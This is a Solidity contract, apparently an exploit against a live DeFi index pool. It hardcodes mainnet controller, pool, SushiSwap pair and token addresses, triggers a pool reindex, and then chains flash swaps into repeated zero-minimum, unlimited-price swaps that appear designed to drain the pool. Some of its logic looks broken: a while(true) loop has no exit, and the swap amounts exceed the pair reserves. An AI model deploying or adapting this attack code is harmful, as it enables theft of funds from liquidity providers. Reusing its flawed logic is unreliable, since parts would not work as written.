pragma solidity ^0.8.0;


interface IMarketCapSqrtController {
    function reindexPool(address poolAddress) external;
}

interface IIndexPool {
  /**
   * @dev Token record data structure
   * @param bound is token bound to pool
   * @param ready has token been initialized
   * @param lastDenormUpdate timestamp of last denorm change
   * @param denorm denormalized weight
   * @param desiredDenorm desired denormalized weight (used for incremental changes)
   * @param index index of address in tokens array
   * @param balance token balance
   */
  struct Record {
    bool bound;
    bool ready;
    uint40 lastDenormUpdate;
    uint96 denorm;
    uint96 desiredDenorm;
    uint8 index;
    uint256 balance;
  }

/* ==========  EVENTS  ========== */

  /** @dev Emitted when tokens are swapped. */
  event LOG_SWAP(
    address indexed caller,
    address indexed tokenIn,
    address indexed tokenOut,
    uint256 tokenAmountIn,
    uint256 tokenAmountOut
  );

  /** @dev Emitted when underlying tokens are deposited for pool tokens. */
  event LOG_JOIN(
    address indexed caller,
    address indexed tokenIn,
    uint256 tokenAmountIn
  );

  /** @dev Emitted when pool tokens are burned for underlying. */
  event LOG_EXIT(
    address indexed caller,
    address indexed tokenOut,
    uint256 tokenAmountOut
  );

  /** @dev Emitted when a token's weight updates. */
  event LOG_DENORM_UPDATED(address indexed token, uint256 newDenorm);

  /** @dev Emitted when a token's desired weight is set. */
  event LOG_DESIRED_DENORM_SET(address indexed token, uint256 desiredDenorm);

  /** @dev Emitted when a token is unbound from the pool. */
  event LOG_TOKEN_REMOVED(address token);

  /** @dev Emitted when a token is unbound from the pool. */
  event LOG_TOKEN_ADDED(
    address indexed token,
    uint256 desiredDenorm,
    uint256 minimumBalance
  );

  /** @dev Emitted when a token's minimum balance is updated. */
  event LOG_MINIMUM_BALANCE_UPDATED(address token, uint256 minimumBalance);

  /** @dev Emitted when a token reaches its minimum balance. */
  event LOG_TOKEN_READY(address indexed token);

  /** @dev Emitted when public trades are enabled. */
  event LOG_PUBLIC_SWAP_ENABLED();

  /** @dev Emitted when the swap fee is updated. */
  event LOG_SWAP_FEE_UPDATED(uint256 swapFee);

  /** @dev Emitted when exit fee recipient is updated. */
  event LOG_EXIT_FEE_RECIPIENT_UPDATED(address exitFeeRecipient);

  /** @dev Emitted when controller is updated. */
  event LOG_CONTROLLER_UPDATED(address exitFeeRecipient);

  function configure(
    address controller,
    string calldata name,
    string calldata symbol,
    address exitFeeRecipient
  ) external;

  function initialize(
    address[] calldata tokens,
    uint256[] calldata balances,
    uint96[] calldata denorms,
    address tokenProvider,
    address unbindHandler
  ) external;

  function setSwapFee(uint256 swapFee) external;

  function delegateCompLikeToken(address token, address delegatee) external;

  function setExitFeeRecipient(address exitFeeRecipient) external;

  function setController(address controller) external;

  function reweighTokens(
    address[] calldata tokens,
    uint96[] calldata desiredDenorms
  ) external;

  function reindexTokens(
    address[] calldata tokens,
    uint96[] calldata desiredDenorms,
    uint256[] calldata minimumBalances
  ) external;

  function setMinimumBalance(address token, uint256 minimumBalance) external;

  function joinPool(uint256 poolAmountOut, uint256[] calldata maxAmountsIn) external;

  function joinswapExternAmountIn(
    address tokenIn,
    uint256 tokenAmountIn,
    uint256 minPoolAmountOut
  ) external returns (uint256/* poolAmountOut */);

  function joinswapPoolAmountOut(
    address tokenIn,
    uint256 poolAmountOut,
    uint256 maxAmountIn
  ) external returns (uint256/* tokenAmountIn */);

  function exitPool(uint256 poolAmountIn, uint256[] calldata minAmountsOut) external;

  function exitswapPoolAmountIn(
    address tokenOut,
    uint256 poolAmountIn,
    uint256 minAmountOut
  )
    external returns (uint256/* tokenAmountOut */);

  function exitswapExternAmountOut(
    address tokenOut,
    uint256 tokenAmountOut,
    uint256 maxPoolAmountIn
  ) external returns (uint256/* poolAmountIn */);

  function gulp(address token) external;

  function swapExactAmountIn(
    address tokenIn,
    uint256 tokenAmountIn,
    address tokenOut,
    uint256 minAmountOut,
    uint256 maxPrice
  ) external returns (uint256/* tokenAmountOut */, uint256/* spotPriceAfter */);

  function swapExactAmountOut(
    address tokenIn,
    uint256 maxAmountIn,
    address tokenOut,
    uint256 tokenAmountOut,
    uint256 maxPrice
  ) external returns (uint256 /* tokenAmountIn */, uint256 /* spotPriceAfter */);

  function isPublicSwap() external view returns (bool);

  function getSwapFee() external view returns (uint256/* swapFee */);

  function getExitFee() external view returns (uint256/* exitFee */);

  function getController() external view returns (address);

  function getExitFeeRecipient() external view returns (address);

  function isBound(address t) external view returns (bool);

  function getNumTokens() external view returns (uint256);

  function getCurrentTokens() external view returns (address[] memory tokens);

  function getCurrentDesiredTokens() external view returns (address[] memory tokens);

  function getDenormalizedWeight(address token) external view returns (uint256/* denorm */);

  function getTokenRecord(address token) external view returns (Record memory record);

  function extrapolatePoolValueFromToken() external view returns (address/* token */, uint256/* extrapolatedValue */);

  function getTotalDenormalizedWeight() external view returns (uint256);

  function getBalance(address token) external view returns (uint256);

  function getMinimumBalance(address token) external view returns (uint256);

  function getUsedBalance(address token) external view returns (uint256);

  function getSpotPrice(address tokenIn, address tokenOut) external view returns (uint256);
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2ERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract Luck {

    address private constant proxy_one2one = 0xF00A38376C8668fC1f3Cd3dAeef42E0E44A7Fcdb;
    address private constant proxy_many2one = 0xfa6de2697D59E88Ed7Fc4dFE5A33daC43565ea41;
    // UNI, AAVE, COMP, CRV*, MKR, SNX
    address[] private  sushi_slps = [0xd3d2E2692501A5c9Ca623199D38826e513033a17, 
            0xD75EA151a61d06868E31F8988D28DFE5E9df57B4, 
            0x31503dcb60119A812feE820bb7042752019F2355, 
            0x58Dc5a51fE44589BEb22E8CE67720B5BC5378009,
            0xBa13afEcda9beB75De5c56BbAF696b880a5A50dD,
            0xA1d7b2d891e3A1f9ef4bBC5be20630C2FEB1c470,
            address(0)];
    uint public slp_counter = 0;
    address[] private tokens = [0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984,
            0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9,
            0xc00e94Cb662C3520282E6f5717214004A7f26888,
            0xD533a949740bb3306d119CC777fa900bA034cd52,
            0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2,
            0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F,
            address(0)];

    function luck() external {
        IMarketCapSqrtController(proxy_one2one).reindexPool(proxy_many2one);
        IUniswapV2Callee(address(this)).uniswapV2Call(address(this), 0, 0, "thank god");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        if (slp_counter < sushi_slps.length) {
            address _token = tokens[slp_counter];
            address _slp = sushi_slps[slp_counter++];
            IUniswapV2ERC20(_token).approve(proxy_many2one, type(uint).max);
            if(_slp != address(0)) {
                (uint _r0, uint _r1,) = IUniswapV2Pair(_slp).getReserves();
                if (_slp != 0x58Dc5a51fE44589BEb22E8CE67720B5BC5378009) {
                    IUniswapV2Pair(_slp).swap(0, _r1 * 100 / 90, address(this), data);
                } else {
                    IUniswapV2Pair(_slp).swap(_r0 * 100 / 90, _r1, address(this), data);
                }
            } else{
                (address _priceToken,) = IIndexPool(proxy_many2one).extrapolatePoolValueFromToken();
                while (true) {
                    uint _swapInput = IIndexPool(proxy_many2one).getBalance(_token) / 2;
                    uint _bal = IUniswapV2ERC20(_token).balanceOf(address(this));
                    if (_swapInput < _bal) {
                        IIndexPool(proxy_many2one).swapExactAmountIn(_token, _swapInput, _priceToken, 0, type(uint).max);
                    } else {
                        IIndexPool(proxy_many2one).swapExactAmountIn(_token, _bal, _priceToken, 0, type(uint).max);
                    }
                }
            }
        }
    }
}